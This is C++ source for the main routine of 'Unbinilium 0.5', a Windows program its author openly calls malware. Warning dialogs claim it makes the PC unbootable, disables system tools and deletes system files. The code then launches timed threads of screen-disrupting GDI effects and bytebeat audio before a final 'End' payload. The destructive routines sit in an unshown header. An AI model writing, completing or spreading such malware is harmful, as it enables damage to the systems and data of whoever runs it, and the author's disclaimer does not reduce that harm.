typedef struct IUnknown IUnknown;

#include "Unbinilium-Main.h"

int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR szCmdParam, int nCmdShow)
{
                if (MessageBoxW(NULL,
		L"WARNING!\r\nThis software is known as malware.\r\nIt will make your PC unbootable and disable system tools.\r\nTo prevent this from happening, press 'No' and delete this file ASAP!\r\nThe creator VenraTech is not responsible for any actions done by this software.\n\nDo you proceed with running?\r\nAuthor's channel: https://www.youtube.com/@venra_malwares",
		L"Unbinilium 0.5.exe",
		MB_ICONWARNING | MB_YESNO) != IDYES) exit(0);
		
		if (MessageBoxW(NULL,
		L"FINAL WARNING!\r\nTHIS MALWARE IS NOT A JOKE! AFTER YOU RUN IT,\r\nYOUR SYSTEM FILES WILL BE DELETED BEYOND REPAIR.\r\nJUST LIKE I SAID,\r\nTHE CREATOR VENRATECH IS NOT RESPONSIBLE FOR ANY DAMAGES!\n\nDO YOU ACTUALLY PROCEED WITH RUNNING?\n\nAuthor's channel: https://www.youtube.com/@venra_malwares",
		L"Unbinilium 0.5.exe - Terrible decision.",
		MB_ICONWARNING | MB_YESNO) != IDYES) exit(0); 
		
		if (!CheckForWindowsXP()) NotWindowsXP();
		
		Sleep(1000 * 2); // 2 Seconds
		
		//ERROR
		HANDLE hPayload0 = CreateThread(NULL, NULL, Error, NULL, NULL, NULL); // Ugh
		
		Sleep(1000 * 2); // 2 Seconds
		
		//SHAKE
		HANDLE hPayload1 = CreateThread(NULL, NULL, GDIPayloads::Shake, NULL, NULL, NULL);
		
		//BYTEBEAT 1
		Bytebeat::BB1();
		
		Sleep(1000 * 15); //15 Seconds
		
		TerminateThread(hPayload1, 0);
		
		CloseHandle(hPayload1);
		
		InvalidateRect(0, 0, 0);
		
		/* Pulling Eyes Out */
		
		//PATBLT + CIRCLES 
		HANDLE hPayload2 = CreateThread(NULL, NULL, GDIPayloads::Payload2, NULL, NULL, NULL);
		HANDLE hPayload2Dot1 = CreateThread(NULL, NULL, GDIPayloads::EllipsePatShake, NULL, NULL, NULL); // Err...
		
		//BYTEBEAT 2
		Bytebeat::BB2();
		
		Sleep(1000 * 30); //30 Seconds
		
		TerminateThread(hPayload2, 0);
		
		CloseHandle(hPayload2);
		
		TerminateThread(hPayload2Dot1, 0);
		
		CloseHandle(hPayload2Dot1);
		
		InvalidateRect(0, 0, 0);
		
		InvalidateRect(0, 0, 0);
		
		/* It Hurts!! */
		
		//SHAKE 2
		HANDLE hPayload3 = CreateThread(NULL, NULL, GDIPayloads::Shake2, NULL, NULL, NULL);
		
		//BYTEBEAT 3
		Bytebeat::BB3();
		
		Sleep(1000 * 25); //25 Seconds
		
		TerminateThread(hPayload3, 0);
		
		CloseHandle(hPayload3);
		
		InvalidateRect(0, 0, 0);
		
		MessageBoxA(NULL, "Click OK to start new payloads.", "Unbinilium 0.5.exe - Final Battle.", MB_ICONERROR); // Woah
		
		Sleep(1000 * 2); //2 Seconds
		
		//MOUSE CLONER, ROTOZOOMER + TRIANGLE
		HANDLE hPayload4 = CreateThread(NULL, NULL, GDIPayloads::Rotozoomer, NULL, NULL, NULL);
		HANDLE hPayload4Dot1 = CreateThread(NULL, NULL, GDIPayloads::RadiusIcon, NULL, NULL, NULL); 
		HANDLE hPayload4Dot2 = CreateThread(NULL, NULL, GDIPayloads::TriangleMoving, NULL, NULL, NULL); 
		
		//BYTEBEAT 4
		Bytebeat::BB4();
		
		Sleep(1000 * 30); //30 Seconds
		
		TerminateThread(hPayload4, 0);
		
		CloseHandle(hPayload4);
		
		InvalidateRect(0, 0, 0);
		
		// End
	        GDIPayloads::End();
}
